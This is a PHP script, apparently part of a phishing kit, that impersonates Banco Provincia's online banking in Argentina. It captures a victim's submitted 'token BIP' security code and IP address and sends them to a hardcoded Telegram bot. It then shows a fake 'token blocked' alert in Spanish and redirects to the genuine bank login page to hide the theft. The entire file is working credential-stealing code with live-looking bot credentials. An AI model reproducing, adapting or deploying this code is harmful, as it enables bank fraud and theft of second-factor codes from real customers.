<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['tres'])){

$message = "token: ".$_POST['tres']."\r\nIP ".$userp."\r\n";

$apiToken = "5538364965:AAEq5z1Q42UqffhYXp2qBXpJP-qXacQn1es";
$data = [
    'chat_id' => '-894957261',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: index.html'); exit();
}
echo '<script language="javascript">alert("TOKEN BIP INCORRECTO\r\n Por su seguridad se ha  bloqueado su token, intente de nuevo en 1 hora.");</script>';
echo '<script type="text/javascript">window.location.href = "https://www.bancoprovincia.bancainternet.com.ar/eBanking/login/inicio.htm";</script>';

?>